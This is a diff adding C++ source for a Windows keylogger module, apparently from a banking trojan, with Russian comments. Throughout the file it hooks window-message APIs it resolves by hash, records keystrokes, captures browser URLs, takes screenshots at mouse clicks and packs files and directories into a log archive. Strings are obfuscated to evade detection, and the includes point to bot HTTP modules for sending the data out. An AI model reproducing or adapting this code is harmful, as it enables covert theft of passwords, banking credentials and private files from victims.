@@ -1,0 +1,2241 @@
+//---------------------------------------------------------------------------
+#include <windowsx.h>
+
+#include "UniversalKeyLogger.h"
+
+#include "GetApi.h"
+#include "Strings.h"
+#include "Memory.h"
+#include "Config.h"
+#include "Utils.h"
+#include "Splice.h"
+#include "Loader.h"
+#include "CabPacker.h"
+#include "ScreenShots.h"
+#include "BotHTTP.h"
+#include "BotCryptHTTP.h"
+#include "Crypt.h"
+#include "Loader.h"
+
+
+//---------------------------------------------------------------------------
+
+//#include "BotDebug.h"
+
+namespace KEYLOGDEBUGSTRINGS
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define KLGDBG KEYLOGDEBUGSTRINGS::DBGOutMessage<>
+
+
+
+//---------------------------------------------------------------------------
+const static char URLFileName[] = {'U', 'R', 'L', '.', 't', 'x', 't',  0};
+
+
+char FieldID[]    = {'i', 'd',  0};
+char FieldType[]  = {'t', 'y', 'p', 'e',  0};
+char FieldHash[]  = {'h', 'a', 's', 'h',  0};
+char FieldSHash[] = {'s', 'h', 'a', 's', 'h',  0};
+char FieldLog[]   = {'l', 'o', 'g',  0};
+
+//---------------------------------------------------------------------------
+
+
+#define KLGFileSignature 0x34F2E7A1
+#define KLGFileVersion   11
+
+#pragma pack(push, 1)
+typedef struct TKLGFileHeader
+{
+	DWORD Signature;          // Сигнатура файла
+	DWORD Version;            // Версия файла
+	DWORD Closed;             // Файл закрыт, кейлогер уже не использует его
+	DWORD SendOnlyCompleted;  // Отправить файл только после установки флага Completed
+	DWORD Completed;          // Признак того, что файл завершён т.е. данные в него записываться не будут
+	DWORD AppHash;            // Хэш процусса
+	DWORD PID;                // Идентификатор процесса
+}*PKLGFileHeader;
+#pragma pack(pop)
+
+//---------------------------------------------------------------------------
+
+// Предварительная дкекларация функций
+void ProcessAllMessages(PMSG Msg, bool IsUnicode);
+void ProcessCharMessage(PMSG Msg, bool IsUnicode);
+void ProcessCharMessage(PMSG Msg);
+void ProcessSetTextMessage(PMSG Msg, bool IsUnicode);
+
+void UpdateIEUrl(HWND Wnd, LPVOID Text, bool IsUnicode);
+
+void ProcessSetTextMessage(HWND Wnd, DWORD Message, int WParam, int LParam, bool IsUnicode);
+
+
+void KeyLoggerCloseFilter(bool CloseSystem = true);
+
+
+//---------------------------------------------------------------------------
+
+// Внутренние данные кейлогера
+struct TKeyLoggerInternalData
+{
+	HWND  FocusWnd;          // Окно владеющее фокусом
+	HWND  UrlEditWnd;        // Окно ввода адреса в IE
+	PCHAR CurrentURL;        // Текущий адрес открытый в активной закладке IE
+	DWORD MaxWndParentLevel; // Максимальный уровень проверки родительских окон
+	PKeyLogSystem System;    // Активная система
+	PWndFilter Filter;       // Активный фильтр
+	PList SystemFilters;     // Список не отработавших фильтров системы
+	HWND FilterParentWND;    // родительское окно на которое сработал фильтр
+    BOOL FileClosed;         // Файл закрыт и больше использоваться не будет
+	BOOL SendAfterCompleted; // Разрешает отправить данные только после полной отработки системы
+	BOOL SystemCompleted;    // Система отработала
+	DWORD ActionsCount;      // Количество действий совершённые пользователем
+	DWORD MaxActions;        // Максимальное количемтво действий, после которых нужно закрыть систему
+	bool UseActionTimer;     // Использовать таймер контроля за последним вводом пользователя
+	DWORD LastActionTime;    // Время последнего действия
+	bool RemoveSystemAfterCompleted; // Удалять систему после завершения
+};
+
+//---------------------------------------------------------------------------
+
+
+PKeyLogger GlobalKeyLogger = NULL; // Глобальный кейлогер
+TKeyLoggerInternalData KLGData;    // Внутренние данные кейлогера
+DWORD KeyLoggerProcess = 0;        // Привязка кейлогера к процессу
+bool  KeyLoggerApiHooked = false;  // Признак того, что в текущем процессе апи кейлогера захукано
+
+
+//---------------------------------------------------------------------------
+PKeyLogger GetLogger(bool CheckActive)
+{
+	if (GlobalKeyLogger == NULL || (CheckActive && !GlobalKeyLogger->Active))
+		return NULL;
+	else
+		return GlobalKeyLogger;
+}
+
+//---------------------------------------------------------------------------
+namespace KeyLoggerHooks
+{
+	// Типы и переменные для хуков
+	typedef LRESULT (WINAPI *PDispatchMessage)(MSG *lpMsg);
+	typedef int (WINAPI *PSendMessage)(HWND Wnd, DWORD Message, int WParam, int LParam);
+	typedef LRESULT (WINAPI *PCallWndProc)(WNDPROC PrevWndFunc, HWND Wnd, DWORD Message, int WParam, int LParam);
+	typedef BOOL (WINAPI *PSetWindowText)(HWND Wnd, PCHAR String);
+   typedef HWND (WINAPI *TSetFocus)(HWND Wnd);
+
+
+	typedef HANDLE (WINAPI *PCreateFile)(
+		LPCWSTR lpFileName,
+		DWORD dwDesiredAccess,
+		DWORD dwShareMode,
+		LPSECURITY_ATTRIBUTES lpSecurityAttributes,
+		DWORD dwCreationDisposition,
+		DWORD dwFlagsAndAttributes,
+		HANDLE hTemplateFile);
+
+
+
+	PDispatchMessage Real_DispatchMessageA;
+	PDispatchMessage Real_DispatchMessageW;
+
+	PSendMessage Real_SendMessageA;
+	PSendMessage Real_SendMessageW;
+
+	PCallWndProc Real_CallWndProcW;
+
+	PSetWindowText Real_SetWindowTextW;
+	PSetWindowText Real_SetWindowTextA;
+
+	PCreateFile Real_CreateFileW;
+
+    TSetFocus Real_SetFocus;
+
+
+	//---------------------------------------------------------------------------
+
+	HWND WINAPI Hook_SetFocus(HWND Wnd)
+	{
+        KLGData.FocusWnd = Wnd;
+        KeyLogger::SetActiveWnd(Wnd);
+		return Real_SetFocus(Wnd);
+    }
+
+
+	LRESULT WINAPI Hook_DispatchMessageA(MSG *lpMsg)
+	{
+		ProcessAllMessages(lpMsg, false);
+		return Real_DispatchMessageA(lpMsg);
+	}
+
+
+
+	LRESULT WINAPI Hook_DispatchMessageW(MSG *lpMsg)
+	{
+		ProcessAllMessages(lpMsg, true);
+		return Real_DispatchMessageW(lpMsg);
+	}
+
+
+	LRESULT WINAPI Hook_SendMessageW(HWND Wnd, DWORD Message, int WParam, int LParam)
+	{
+		if (Message == WM_SETTEXT)
+			ProcessSetTextMessage(Wnd, Message, WParam, LParam, true);
+
+		return Real_SendMessageW(Wnd, Message, WParam, LParam);
+	}
+
+	LRESULT WINAPI Hook_SendMessageA(HWND Wnd, DWORD Message, int WParam, int LParam)
+	{
+		if (Message == WM_SETTEXT)
+			ProcessSetTextMessage(Wnd, Message, WParam, LParam, false);
+
+		return Real_SendMessageA(Wnd, Message, WParam, LParam);
+	}
+
+
+	BOOL WINAPI Hook_SetWindowTextW(HWND Wnd, PWCHAR String)
+	{
+		BOOL Result = Real_SetWindowTextW(Wnd, (PCHAR)String);
+
+		if (Result)
+		{
+			UpdateIEUrl(Wnd, String, true);
+		}
+		return Result;
+	}
+
+
+	//------------------------------------------------------------------------
+
+	bool HookKeyLoggerApi()
+	{
+		// Ставим хуки на нужные апи
+		if (KeyLoggerApiHooked)
+			return true;
+
+		#define HASH_SETFOCUS 0x6D5F6D57 /* SetFocus */
+		const static DWORD Hash_DispatchMessageA = 0x4BAED1C8;
+		const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
+		const static DWORD Hash_SendMessageA = 0x58A81C29;
+		const static DWORD Hash_SendMessageW = 0x58A81C3F;
+		const static DWORD Hash_CallWindowProcW = 0xEE5FDA91;
+		const static DWORD Hash_CreateWindowExW = 0xBF7EFB4C;
+		const static DWORD Hash_SetWindowTextW = 0x3C29101C;
+		const static DWORD Hash_CreateFileW = 0x8F8F114; //0x8F8F102;
+
+
+//		if (HookApi(3, Hash_DispatchMessageA, (DWORD)&Hook_DispatchMessageA ) )
+//		{
+//			__asm mov [Real_DispatchMessageA], eax
+//		}
+//		else return false;
+//
+//		if (HookApi(3, Hash_DispatchMessageW, (DWORD)&Hook_DispatchMessageW ) )
+//		{
+//			__asm mov [Real_DispatchMessageW], eax
+//		}
+//		else return false;
+
+
+		if (HookApi(3, HASH_SETFOCUS, (DWORD)&Hook_SetFocus) )
+		{
+			__asm mov [Real_SetFocus], eax
+		}
+		else return false;
+
+
+		if (HookApi(3, Hash_SetWindowTextW, (DWORD)&Hook_SetWindowTextW) )
+		{
+			__asm mov [Real_SetWindowTextW], eax
+		}
+		else return false;
+
+		if (HookApi(3, Hash_SendMessageA, (DWORD)&Hook_SendMessageA))
+		{
+			__asm mov [Real_SendMessageA], eax
+		}
+		else return false;
+
+
+		if (HookApi(3, Hash_SendMessageW, (DWORD)&Hook_SendMessageW))
+		{
+			__asm mov [Real_SendMessageW], eax
+		}
+		else return false;
+
+//		if (HookApi(1, Hash_CreateFileW, (DWORD)&Hook_CreateFileW))
+//		{
+//			__asm mov [Real_CreateFileW], eax
+//		}
+//		else return false;
+
+		KeyLoggerApiHooked = true;
+		return true;
+	}
+
+//---------------------------------------------------------------------------
+} // Key logger HOOKS
+
+
+
+//---------------------------------------------------------------------------
+LRESULT WINAPI KeyLoggerSubClassingWndProc(HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam)
+{
+	// Подменённая оконная процедура
+	MSG Rec;
+	ClearStruct(Rec);
+	Rec.hwnd = Wnd;
+	Rec.message = Msg;
+	Rec.wParam = WParam;
+	Rec.lParam = LParam;
+
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger != NULL)
+	{
+		bool IsUnicode = pIsWindowUnicode(Wnd);
+
+		ProcessAllMessages(&Rec, IsUnicode);
+		return SubClassing::CallOriginalProc(Logger->WndProcList, Wnd, Msg, WParam, LParam);
+	}
+	return 0;
+}
+
+//---------------------------------------------------------------------------
+
+/*
+LRESULT WINAPI KeyLoggerPraentWndProc(HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam)
+{
+	if (Wnd == KLGData.FilterParentWND)
+	{
+		if (Msg == WM_DESTROY )
+//		if (Msg == WM_SYSCOMMAND && (WParam & 0xFFF0) == SC_CLOSE)
+		{
+			// Родительское окно текущего фильтра уничтожается. Закрываем фильтр
+			KeyLogger::SetActiveWnd(NULL);
+            KeyLoggerCloseFilter();
+        }
+    }
+
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger != NULL)
+	{
+		return SubClassing::CallOriginalProc(Logger->WndProcList, Wnd, Msg, WParam, LParam);
+	}
+	return 0;
+}      */
+
+//---------------------------------------------------------------------------
+/*
+LRESULT WINAPI KeyLoggerMonitorProc(HWND Wnd, UINT Msg, WPARAM WParam, LPARAM LParam)
+{
+	// Функция мониторинга за окном обладающим фокусом ввода
+
+
+	if (Msg == WM_TIMER)
+	{
+		// Проверяем окно обладающего фокусом ввода
+		PKeyLogger Logger = GetLogger(true);
+		if (Logger != NULL)
+		{
+			HWND Wnd = (HWND)pGetFocus();
+			if (KLGData.FocusWnd != Wnd)
+			{
+                KLGDBG("KeyLogger", "Фокус сменился");
+				KLGData.FocusWnd = Wnd;
+				KeyLogger::SetActiveWnd(Wnd);
+			}
+        }
+
+		return 0;
+    }
+
+
+	return (LRESULT)pDefWindowProcA(Wnd, Msg, WParam, LParam);
+}
+*/
+
+
+
+//--------------------- Методы для работы с событиями кейлогера ------------------------------
+
+
+void IncActionCounter()
+{
+	// Цвеличиваем счётчик действий
+	if (KLGData.System == NULL)
+		return;
+
+	KLGData.ActionsCount++;
+	KLGData.LastActionTime = (DWORD)pGetTickCount();
+
+	if (KLGData.MaxActions != 0 && KLGData.ActionsCount >= KLGData.MaxActions)
+	{
+		KLGData.SystemCompleted = true;
+		KeyLogger::CloseSession();
+    }
+
+}
+
+//----------------------------------------------------------------------------
+void CALLBACK KeyLoggerTimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
+{
+	// Функция контроля ввода пользователем данных
+	if (KLGData.System == NULL || !KLGData.UseActionTimer)
+    	return;
+
+	if ((DWORD)pGetTickCount() - KLGData.LastActionTime >= MAX_NON_ACTION_INTERVAL)
+	{
+		KLGData.SystemCompleted = true;
+		KeyLogger::CloseSession();
+    }
+}
+
+
+// Структура хранения подключенных обработчиков событий
+
+typedef struct TKLGEventHandlerItem
+{
+	TKeyLoggerEventHandler Handler;
+	DWORD EventID;
+
+} *PKLGEventHandlerItem;
+
+
+void FreeEventHandlerItem(LPVOID Item)
+{
+	if (Item != NULL)
+		FreeStruct(Item);
+}
+
+void CallKeyLoggerEvent(DWORD EventID, LPVOID Data)
+{
+	// Вызываем событие кейлогера
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL)
+		return;
+
+	// Цикл обрабатываем в обратном порядке по причине того, что
+	// возможна ситуация когда после срабатывания обработчика
+	// он отключится от кейлогера
+	for (int i = List::Count(Logger->Events) - 1; i >= 0; i--)
+	{
+		PKLGEventHandlerItem Item = (PKLGEventHandlerItem)List::GetItem(Logger->Events, i);
+		if (Item == NULL)
+			continue;
+
+		if (Item->EventID == 0 || Item->EventID == EventID)
+			Item->Handler(Logger, EventID, Data);
+	}
+}
+
+//---------------------------------------------------------------------------
+
+
+PCHAR GetNonPrintCharText(DWORD Char)
+{
+	// Функция возвращает текст для непечатного символа
+	PCHAR S = NULL;
+	bool FreeS = false;
+
+	switch (Char) {
+		case VK_RETURN: S = "\r\n"; break;
+		case VK_BACK:   S = "BackSpace";
+
+	default:
+	{
+		S = StrLongToString(Char);
+		FreeS = true;
+    }
+	}
+
+	PCHAR Result = STR::New(3, "{", S, "}");
+	if (FreeS)
+		STR::Free(S);
+	return Result;
+}
+
+void ProcessCharMessage(PMSG Msg, bool IsUnicode)
+{
+	// Отображаем отображение символа WM_CHAR
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL)
+		return;
+
+	KeyLogger::SetActiveWnd(Msg->hwnd);
+
+	if (Logger->ActiveWND == NULL)
+		return;
+
+	PCHAR Buf = NULL;
+	DWORD BufLen = 0;
+	bool FreeBuf = false;
+
+    bool IncCounter = false;
+
+	DWORD Code = Msg->wParam;
+	if (Code >= 32)
+	{
+		// Добавляем печатные символы
+		if (!IsUnicode)
+		{
+			// В ANSI версии передаём один символ
+			Buf = (PCHAR)&Code;
+            BufLen = 1;
+		}
+		else
+		{
+			// Добавляем Unicode  символ
+			WCHAR WChar = (WCHAR)Code;
+			FreeBuf = true;
+            Buf = WSTR::ToAnsi(&WChar,  1);
+		}
+
+		IncCounter = true;
+	}
+	else
+	{
+		// Отображаем непечатаемый символ
+		Buf = GetNonPrintCharText(Code);
+        FreeBuf = true;
+    }
+
+	#ifdef DebugUtils
+		PCHAR TmpStr = STR::New(Buf, BufLen);
+		KLGDBG("KeyLogger", "Ввод - %s", TmpStr);
+		STR::Free(Buf);
+	#endif
+
+	KeyLogger::AddStrToBuffer(Buf, BufLen);
+	if (FreeBuf)
+		STR::Free(Buf);
+
+	if (IncCounter)
+    	IncActionCounter();
+}
+//---------------------------------------------------------------------------
+
+void ProcessMouseMessage(PMSG Msg)
+{
+	// Обрабатываем сообщения мыши
+
+
+	// ОБРАБОТКУ КЛИКОВ МЫШЬЮ ПОКА ОТКЛЮЧИМ
+
+	if ((Msg->wParam & MK_LBUTTON) == 0)
+		return;
+
+
+	IncActionCounter();
+
+    return;
+
+
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL) return;
+
+    // Пытаемся отфильтровать окно
+	PKeyLogSystem System;
+	PWndFilter Filter;
+	HWND ParentWND;
+	if (!KeyLogger::FiltrateWnd(Msg->hwnd, LOG_MOUSE, 0, &System, &Filter, &ParentWND))
+		return;
+	if (Filter == NULL)
+		return;
+
+	// Определяем координаты нажатия
+	DWORD Width  = Filter->Data.SSWidth;
+	DWORD Height = Filter->Data.SSHeight;
+
+	if (Width == NULL)  Width  = DEFAULT_SCREENSHOT_WIDTH;
+	if (Height == NULL) Height = DEFAULT_SCREENSHOT_HEIGHT;
+
+	POINT PT;
+	PT.x = GET_X_LPARAM(Msg->lParam);
+	PT.y = GET_Y_LPARAM(Msg->lParam);
+
+
+	pClientToScreen(Msg->hwnd, &PT);
+
+	// Создаём скриншот
+	TDrawCursorInfo CD;
+	CD.Mode = 0;
+	CD.X = PT.x;
+	CD.Y = PT.y;
+	CD.PointWidth = 4;
+	CD.Color = Filter->Data.CursorColor;
+	if (CD.Color == 0)
+		CD.Color = COLOR_RED;
+
+	PT.x -= Width/2;
+	PT.y -= Height/2;
+
+	LPBYTE Shot;
+	DWORD  Size;
+	if (ScreenShot::MakeToMem(NULL, PT.x, PT.y, Width, Height, &CD, Shot, Size))
+	{
+		KeyLogger::AddScreenShot(!Filter->Data.DontShowSSInStr, Shot, Size);
+		MemFree(Shot);
+	}
+}
+
+//---------------------------------------------------------------------------
+bool CompareWndClassNames(HWND Wnd, PCHAR *Names)
+{
+	// Функция сравнивает иерархию имён классов
+	if (Wnd == NULL || Names == NULL || *Names == NULL)
+		return false;
+
+	const static DWORD Len = 50;
+	char ClassName[Len + 1];
+
+
+	while (Wnd != NULL && *Names != NULL)
+	{
+		ClassName[0] = 0;
+		pGetClassNameA(Wnd, ClassName, Len);
+
+		if (!StrSame(*Names, ClassName, true))
+		{
+			return false;
+        }
+
+		Wnd = (HWND)pGetParent(Wnd);
+		Names++;
+	}
+	/* Успех только в случае совпаденяи всех имён */
+	return *Names == NULL;
+}
+
+
+bool IsIEAdressBar(HWND Wnd)
+{
+	// Функция возвращает истину если
+	// класс окна соответствует классу окна адресной строки
+	// Интернет Експлорера
+	if (KLGData.UrlEditWnd != NULL)
+		return KLGData.UrlEditWnd == Wnd;
+
+
+	const static char Edit[]          = {'E', 'd', 'i', 't',  0};
+	const static char ComboBox[]      = {'C', 'o', 'm', 'b', 'o', 'B', 'o', 'x',  0};
+	const static char ComboBoxEx32[]  = {'C', 'o', 'm', 'b', 'o', 'B', 'o', 'x', 'E', 'x', '3', '2',  0};
+	const static char ReBarWindow32[] = {'R', 'e', 'B', 'a', 'r', 'W', 'i', 'n', 'd', 'o', 'w', '3', '2',  0};
+	const static char WorkerW[]       = {'W', 'o', 'r', 'k', 'e', 'r', 'W',  0};
+	const static char IEFrame[]       = {'I', 'E', 'F', 'r', 'a', 'm', 'e',  0};
+
+	const static char AddressBandRoot[] = {'A', 'd', 'd', 'r', 'e', 's', 's', ' ', 'B', 'a', 'n', 'd', ' ', 'R', 'o', 'o', 't',  0};
+
+    // Иерархия имён классов ИЕ6
+	const static PCHAR IE6Names[] = {
+					(PCHAR)Edit,
+					(PCHAR)ComboBox,
+					(PCHAR)ComboBoxEx32,
+					(PCHAR)ReBarWindow32,
+					(PCHAR)WorkerW,
+					(PCHAR)IEFrame,
+					NULL};
+
+	const static PCHAR IE7Names[] = {
+					(PCHAR)Edit,
+					(PCHAR)ComboBox,
+					(PCHAR)ComboBoxEx32,
+					(PCHAR)AddressBandRoot,
+					(PCHAR)ReBarWindow32,
+					(PCHAR)WorkerW,
+					(PCHAR)IEFrame,
+					NULL};
+
+	const static PCHAR IE8Names[] = {
+					(PCHAR)Edit,
+					(PCHAR)AddressBandRoot,
+					(PCHAR)ReBarWindow32,
+					(PCHAR)WorkerW,
+					(PCHAR)IEFrame,
+					NULL};
+
+
+	bool Result = CompareWndClassNames(Wnd, (PCHAR*)&IE8Names[0]) ||
+				  CompareWndClassNames(Wnd, (PCHAR*)&IE7Names[0]) ||
+				  CompareWndClassNames(Wnd, (PCHAR*)&IE6Names[0]);
+	// Сохраняем хэндл окна
+	if (Result)
+	    KLGData.UrlEditWnd = Wnd;
+
+	return  Result;
+}
+
+
+void UpdateIEUrl(HWND Wnd, LPVOID Text, bool IsUnicode)
+{
+	// Функция получает адрес указанный в строке ввода адреса ИЕ
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL || Text == NULL) return;
+
+	if (!IsIEAdressBar(Wnd)) return;
+
+
+	// Сохраняем старый адрес
+	PCHAR OldURL = KLGData.CurrentURL;
+	KLGData.CurrentURL = NULL;
+
+	// Получаем новый
+	if (IsUnicode)
+		KLGData.CurrentURL = WSTR::ToAnsi((PWCHAR)Text, 0);
+	else
+		KLGData.CurrentURL = STR::New((PCHAR)Text);
+
+	// Допускаем только два протокола
+	if (!StrSame(KLGData.CurrentURL, "http://", true, 7) &&
+		!StrSame(KLGData.CurrentURL, "https://", true, 8))
+	{
+		STR::Free2(KLGData.CurrentURL);
+	}
+
+	// Уведомляем об изменении адреса
+    // Сравниваем старый и новый адрес
+	if (!StrSame(KLGData.CurrentURL, OldURL, true, 0))
+		CallKeyLoggerEvent(KLE_IE_URL_CHANGED, KLGData.CurrentURL);
+
+    STR::Free(OldURL);
+}
+//----------------------------------------------------------------------------
+
+BOOL CALLBACK KeyLoggerEnumJavaAdressBar(HWND Wnd, LONG Data)
+{
+    // Функция перебора дочерних окон для ява процесса
+	HWND *W = (HWND *)Data;
+	if (*W != NULL)
+		return FALSE;
+
+	if (IsIEAdressBar(Wnd))
+	{
+		*W = Wnd;
+		return FALSE;
+	}
+
+
+    pEnumChildWindows(Wnd, KeyLoggerEnumJavaAdressBar, Data);
+
+    return TRUE;
+}
+
+HWND KeyLoggerSearchAddressBarWND()
+{
+	// Функция ищет окно адресной строки ИЕ
+	if (KLGData.UrlEditWnd != NULL)
+	{
+		if (KLGData.UrlEditWnd == INVALID_HANDLE_VALUE)
+			return NULL;
+		else
+            return KLGData.UrlEditWnd;
+	}
+
+	// Определяем самое нижнее окно
+	HWND Parent;
+	HWND Wnd = KLGData.FocusWnd;
+	if (Wnd == NULL)
+		Wnd = (HWND)pGetFocus();
+
+	if (Wnd == NULL)
+		return NULL;
+
+	do
+	{
+		Parent = (HWND)pGetParent(Wnd);
+		if (Parent == NULL)
+			break;
+        Wnd = Parent;
+	}
+	while (Parent != NULL);
+		
+
+	// Включаем перебор окон
+	HWND Result = NULL;
+
+	pEnumChildWindows(Wnd, KeyLoggerEnumJavaAdressBar, (LONG)&Result);
+
+	if (Result == NULL)
+	{
+		// Не удалось найти окно ввода адреса. Означает, что это не
+		// браузер и оно отсутствует. Во избежание лишних затрат ресурсов
+		// при следующем поиске, помечаем окно как ошибочноеж
+        KLGData.UrlEditWnd = (HWND)INVALID_HANDLE_VALUE;
+	}
+	else
+        KLGData.UrlEditWnd = Result;
+
+	return Result;
+
+}
+//----------------------------------------------------------------------------
+
+PCHAR GetURLFromJavaProcess()
+{
+	// Функция возвращает текущий урл в процессе явы запущенного на странице ШУ
+	STR::Free2(KLGData.CurrentURL);
+
+	HWND Wnd = KeyLoggerSearchAddressBarWND();
+	if (Wnd == NULL)
+		return NULL;
+
+    KLGData.CurrentURL = GetWNDText(Wnd);
+
+	return KLGData.CurrentURL;
+}
+//----------------------------------------------------------------------------
+
+void ProcessSetTextMessage(HWND Wnd, DWORD Message, int WParam, int LParam, bool IsUnicode)
+{
+	MSG Msg;
+	ClearStruct(Msg);
+
+	Msg.hwnd = Wnd;
+	Msg.message = Message;
+	Msg.wParam = WParam;
+	Msg.lParam = LParam;
+	ProcessSetTextMessage(&Msg, IsUnicode);
+}
+
+
+void ProcessSetTextMessage(PMSG Msg, bool IsUnicode)
+{
+	// Обрабатываем сообщение WM_SETTEXT
+
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL) return;
+
+    UpdateIEUrl(Msg->hwnd, (LPVOID)Msg->lParam, IsUnicode);
+}
+
+
+//---------------------------------------------------------------------------
+
+void ProcessAllMessages(PMSG Msg, bool IsUnicode)
+{
+	// Обрабатываем сообщения
+
+	if (GetLogger(true) != NULL)
+	{
+		switch (Msg->message) {
+            case WM_CHAR: 		 ProcessCharMessage(Msg, IsUnicode); break;
+			case WM_LBUTTONDOWN: ProcessMouseMessage(Msg); break;
+			case CB_SELECTSTRING:
+			case WM_SETTEXT:     ProcessSetTextMessage(Msg, IsUnicode); break;
+
+		}
+	}
+}
+
+//---------------------------------------------------------------------------
+//  DataLogger - Методы для логирования данных
+//---------------------------------------------------------------------------
+
+#pragma pack(push, 1)
+// Заголовок блока данных логера
+typedef struct TLoggerBlockHead
+{
+	DWORD WND;
+	DWORD DataType;
+	DWORD Size;
+	DWORD NameSize;
+}*PLoggerBlockHead;
+#pragma pack(pop)
+
+
+void FreeKeyLoggerFilter(LPVOID Data)
+{
+	// Уничтожить фильтр
+	PWndFilter Filter = (PWndFilter)Data;
+
+	STR::Free(Filter->ClassName);
+	STR::Free(Filter->Text);
+
+	STR::Free(Filter->Data.URL);
+
+    FreeStruct(Filter);
+}
+
+
+void FreeLoggerSystem(LPVOID Data)
+{
+	// Уничтожить систему логера
+	PKeyLogSystem S = (PKeyLogSystem)Data;
+
+	STR::Free(S->Name);
+	List::Free(S->Filters);
+
+    FreeStruct(S);
+}
+
+
+
+PKeyLogger KeyLogger::Initialize(PCHAR AppName)
+{
+	// Инициализировать кейлогер
+	if (IsNewProcess(KeyLoggerProcess))
+	{
+		GlobalKeyLogger = NULL;
+		KeyLoggerApiHooked = false;
+		ClearStruct(KLGData);
+	}
+
+	if (GlobalKeyLogger != NULL)
+		return GlobalKeyLogger;
+
+
+	PKeyLogger Logger = CreateStruct(TKeyLogger);
+	if (Logger == NULL)
+		return NULL;
+
+	// Инициализируем информауию о процессе
+    bool FreeAppName = false;
+	if (STR::IsEmpty(AppName))
+	{
+		FreeAppName = true;
+        AppName = STR::Alloc(MAX_PATH);
+        pGetModuleFileNameA(NULL, AppName, MAX_PATH);
+    }
+
+    KLGDBG("KeyLogger", "Инициализируем кейлогер в процессе [%s]", AppName);
+
+	PCHAR FileName = File::ExtractFileNameA(AppName, false);
+    DWORD H = STR::GetHash(FileName, 0, true);
+
+	Logger->ProcessName = STR::New(AppName);
+	Logger->ProcessNameHash = H;
+
+	// Пробуем определить в каком процессе работаем
+	if (H == PROCESS_HASH_IE)
+		Logger->Process = PROCESS_IE;
+	else
+	if (H == PROCESS_HASH_JAVA)
+		Logger->Process = PROCESS_JAVA;
+	else
+		Logger->Process = PROCESS_UNKNOWN;
+
+
+
+	if (FreeAppName)
+		STR::Free(AppName);
+
+	// Создаём остальные данные
+	Logger->PID = GetUniquePID();
+
+	Logger->Events = List::Create();
+	List::SetFreeItemMehod(Logger->Events,  FreeEventHandlerItem);
+
+	Logger->Systems = List::Create();
+	List::SetFreeItemMehod(Logger->Systems, FreeLoggerSystem);
+
+    Logger->WndProcList = SubClassing::CreateList();
+
+	// Создаём буфер
+	Logger->BufferSize = 4096;
+	Logger->Buffer     = (PCHAR)MemAlloc(Logger->BufferSize);
+	Logger->Position   = 0;
+
+	GlobalKeyLogger = Logger;
+
+    KLGData.SystemFilters = List::Create();
+
+
+    return Logger;
+}
+//---------------------------------------------------------------------------
+
+bool KeyLogger::Start()
+{
+
+	if (GlobalKeyLogger == NULL)
+		return false;
+
+	// Запуск кейлогера
+
+	if (!GlobalKeyLogger->Active)
+	{
+		KLGDBG("KeyLogger", "Запускаем кейлогер");
+        // Ставимна хуки на нужные апи
+		GlobalKeyLogger->Active = KeyLoggerHooks::HookKeyLoggerApi();
+
+		// Создаём методы мониторинга за фокусом
+		HWND Wnd = (HWND)pGetFocus();
+		SetActiveWnd(Wnd);
+
+		// Включаем аймер мониторинга за действиями пользователя.
+		pSetTimer(NULL, 1, 5000, KeyLoggerTimerProc);
+	}
+
+	if (GlobalKeyLogger->Active)
+	{
+		CallKeyLoggerEvent(KLE_ACTIVATED, NULL);
+		return true;
+	}
+	else
+		return false;
+}
+//---------------------------------------------------------------------------
+
+void KeyLogger::AddStrToBuffer(PCHAR Str, DWORD StrLen)
+{
+	// Добавить строку в буфер
+	PKeyLogger Logger = GetLogger(true);
+
+	if (Logger == NULL || STR::IsEmpty(Str))
+		return;
+
+	if (StrLen == 0)
+		StrLen = StrCalcLength(Str);
+
+	// В данный момент не кешируем текстовые данные в буфер, а непосредственно
+	// записываем данные в файл
+    WriteToFile(Logger->ActiveWND, NULL, KEYLOGGER_DATA_TEXT, Str, StrLen);
+
+}
+//---------------------------------------------------------------------------
+
+void KeyLogger::AddScreenShot(bool AddToKeyLog, LPBYTE ScreenShot, DWORD Size)
+{
+	// Добавить скриншот
+	// Если AddToKeyLog то информация о снимке будет добавлена в буффер кейлога
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL) return;
+
+	WriteToFile((HWND)Logger->ImageIndex, NULL, KEYLOGGER_DATA_IMAGEPNG, ScreenShot, Size);
+
+	if (AddToKeyLog)
+	{
+		// Добавляем информацию о скрине в буфер кейлогера
+		PCHAR N = StrLongToString(Logger->ImageIndex);
+		PCHAR Buf = STR::New(3, "<", N, ".png>");
+
+		AddStrToBuffer(Buf, 0);
+
+		STR::Free(N);
+		STR::Free(Buf);
+    }
+
+
+    Logger->ImageIndex++;
+}
+
+//---------------------------------------------------------------------------
+
+void KeyLogger::AddFile(PCHAR FileName, PCHAR Name, LPVOID FileData, DWORD FileDataSize)
+{
+	// Функция добавляет файл в архив кейлогера
+	// FileName - реальное имя файла
+	// Name - имя с которым директория будет добавлена в архив
+	if (FileData != NULL)
+	{
+        WriteToFile(NULL, Name, KEYLOGGER_DATA_FILE, FileData, FileDataSize);
+		return;
+    }
+	DWORD DataSize = 0;
+	LPBYTE Data = File::ReadToBufferA(FileName, DataSize);
+	if (Data != NULL)
+	{
+		WriteToFile(NULL, Name, KEYLOGGER_DATA_FILE, Data, DataSize);
+		MemFree(Data);
+	}
+}
+
+//---------------------------------------------------------------------------
+
+void KeyLogger_AddFile(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
+{
+	// Добавляем файл в архив логера
+    PCHAR Name = STR::New(3, (PCHAR)Data, "\\", Search->cFileName);
+	KeyLogger::AddFile(FileName, Name, NULL, 0);
+	STR::Free(Name);
+}
+
+void KeyLogger::AddDirectory(PCHAR Path, PCHAR Name)
+{
+	// Функция добавляет директорию в архив кейлогера
+	// Path - реальный путь к директории
+	// Name - имя с которым директория будет добавлена в архив
+	PKeyLogger Logger = GetLogger(true);
+	if (Logger == NULL) return;
+	SearchFiles(Path, "*.*", false, FA_ANY_FILES, Name, KeyLogger_AddFile);
+}
